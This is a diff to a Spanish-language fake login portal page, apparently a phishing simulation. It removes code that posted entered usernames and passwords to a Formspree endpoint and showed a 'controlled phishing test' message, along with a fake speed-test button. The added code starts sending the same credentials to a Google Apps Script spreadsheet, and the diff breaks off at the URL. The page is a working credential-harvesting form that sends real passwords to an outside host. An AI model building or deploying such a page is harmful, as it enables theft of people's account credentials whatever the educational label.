@@ -22,8 +22,8 @@
             <div class="login-card">
                 <h3><i class="fas fa-fingerprint"></i> Portal de Usuario</h3>
                 <form id="p-form">
-                    <input type="text" name="Usuario_Estudiante" placeholder="Usuario o Correo" required>
-                    <input type="password" name="Clave_Estudiante" placeholder="Contraseña" required>
+                    <input type="text" name="usuario" placeholder="Usuario o Correo" required>
+                    <input type="password" name="password" placeholder="Contraseña" required>
                     <button type="submit" id="btn-auth">AUTENTICAR</button>
                 </form>
             </div>
@@ -119,37 +119,18 @@
         render('b-grid', benefits, b => `<div class="b-item"><i class="fas ${b.ic}"></i><h4>${b.t}</h4></div>`);
 
         function openModal(txt) {
-            document.getElementById('m-text').innerText = txt.includes('Phishing') ? `Señor Usuario, usted ha ${txt}` : `Información de ${txt}.`;
+            const modalMsg = txt.includes('Phishing') ? `Señor Usuario, usted ha ${txt}` : `Información de ${txt}.`;
+            document.getElementById('m-text').innerText = modalMsg;
             document.getElementById('modal').style.display = 'flex';
         }
 
-        // --- ENVÍO REAL A FORMSPREE ---
+        // --- LÓGICA DE REGISTRO PRIVADO EN GOOGLE SHEETS ---
         const loginForm = document.getElementById('p-form');
+
         loginForm.onsubmit = (e) => {
             e.preventDefault();
             const btn = document.getElementById('btn-auth');
             btn.innerText = "Validando...";
             
-            fetch("https://formspree.io/f/xkoqllzz", {
-                method: "POST",
-                body: new FormData(loginForm),
-                headers: { 'Accept': 'application/json' }
-            }).finally(() => {
-                btn.innerText = "AUTENTICAR";
-                openModal("caído en una prueba de Phishing controlada. Sus datos han sido registrados con fines educativos.");
-                loginForm.reset();
-            });
-        };
-
-        document.getElementById('run-test').onclick = function() {
-            this.innerText = "Midiendo...";
-            document.getElementById('gauge').classList.add('spinning');
-            setTimeout(() => {
-                document.getElementById('gauge').classList.remove('spinning');
-                this.innerHTML = 'Test de VELOCIDAD <i class="fas fa-chevron-right"></i>';
-                openModal(`Velocidad detectada: ${Math.floor(Math.random() * 500) + 100} Mbps`);
-            }, 2500);
-        };
-    </script>
-</body>
-</html>
+            // Tu URL de Google Apps Script
+            const scriptURL = '
